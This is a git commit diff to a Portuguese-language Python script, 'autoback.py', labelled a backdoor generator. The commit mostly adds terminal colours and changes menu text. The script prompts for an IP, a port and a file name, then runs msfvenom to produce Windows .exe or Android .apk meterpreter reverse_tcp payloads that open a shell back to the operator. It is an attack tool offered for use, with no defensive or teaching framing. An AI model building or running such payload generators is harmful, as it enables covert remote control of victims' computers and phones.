27110d43b912b86192e68a8613f4113f29469771
Kiny-Kiny <70079144+Kiny-Kiny@users.noreply.github.com>
2021-07-19 01:14:42 -0300

    Update autoback.py

--- data/autoback.py
+++ data/autoback.py
@@ -1,14 +1,24 @@
 import socket
 import time
 import os
+global R, B, C, Y, G, RT, CY, CO
+CO='\033[m'
+R='\033[1;31m'
+B='\033[1;34m'
+C='\033[1;37m'
+CY='\033[1;36m'
+Y='\033[1;33m'
+G='\033[1;32m'
+RT='\033[;0m'
 def main():
-	print("""
+	print(f"""{G}
 ░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗
 ██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
 ███████║██║░░░██║░░░██║░░░██║░░██║██████╦╝███████║██║░░╚═╝█████═╝░
 ██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔══██╗██╔══██║██║░░██╗██╔═██╗░
 ██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██████╦╝██║░░██║╚█████╔╝██║░╚██╗
 ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
+
 ▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
 ▒▒█▒▒▒▄██████████▄▒▒▒▒
 ▒█▐▒▒▒████████████▒▒▒▒
@@ -17,26 +27,26 @@ def main():
 ▐┼▐▒▒██████████████▒▒▒
 ▐▄▐████─▀▐▐▀█─█─▌▐██▄▒ 
 ▒▒█████──────────▐███▌
-▒▒█▀▀██▄█─▄───▐─▄███▀▒ feito por: Kira"
+▒▒█▀▀██▄█─▄───▐─▄███▀▒ Coded By: Kira"
 ▒▒█▒▒███████▄██████▒▒▒ 25 de jun de 2021"
 ▒▒▒▒▒██████████████▒▒▒ AUTOBACK.v01"
 ▒▒▒▒▒█████████▐▌██▌▒▒▒
 ▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
-			|======GERADOR DE BACKDOOR======|
-			| [ 1 ] Windows                 |
-			| [ 2 ] Android                 |
+▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒{C}
+			|======{G}GERADOR DE BACKDOOR{C}======|
+			| [ {G}1{C} ] Windows                 |
+			| [ {G}2{C} ] Android                 |
 			|===============================|
 			""")
-	opção = int(input("Escolha a opção para Windows(1) ou para Android(2): "))
-	ip = input("Digite o seu ip: ")
-	port = input("Digite a porta, Recomendado 4444: ")
-	nome = input("Digite o nome do seu backdoor: ")
-	if opção == 1:
+	op = int(input(f"[{Y}!{C}]{G} Digite a opção que deseja ~/ "))
+	ip = input(f"{C}[{Y}!{C}]{G} Digite o seu ip ~/ ")
+	port = input(f"{C}[{Y}!{C}]{G} Digite a porta, Recomendado 4444 ~/ ")
+	nome = input(f"{C}[{Y}!{C}]{G} Digite o nome do seu backdoor ~/ ")
+	if op == 1:
 			os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST={ip} LPORT={port} R > {nome}.exe")
-			print("BACKDOOR CRIADO COM SUCESSO!");time.sleep(2)
-	elif opção == 2:
+			print(f"{G}BACKDOOR CRIADO COM SUCESSO!");time.sleep(2)
+	elif op == 2:
 		os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {nome}.apk")
-		print("BACKDOOR CRIADO COM SUCESSO!");time.sleep(2)
+		print(f"{G}BACKDOOR CRIADO COM SUCESSO!");time.sleep(2)
 	else:
-		print("Opção Inválida");time.sleep(2)
+		print(f"{R}Opção Inválida!");time.sleep(2)
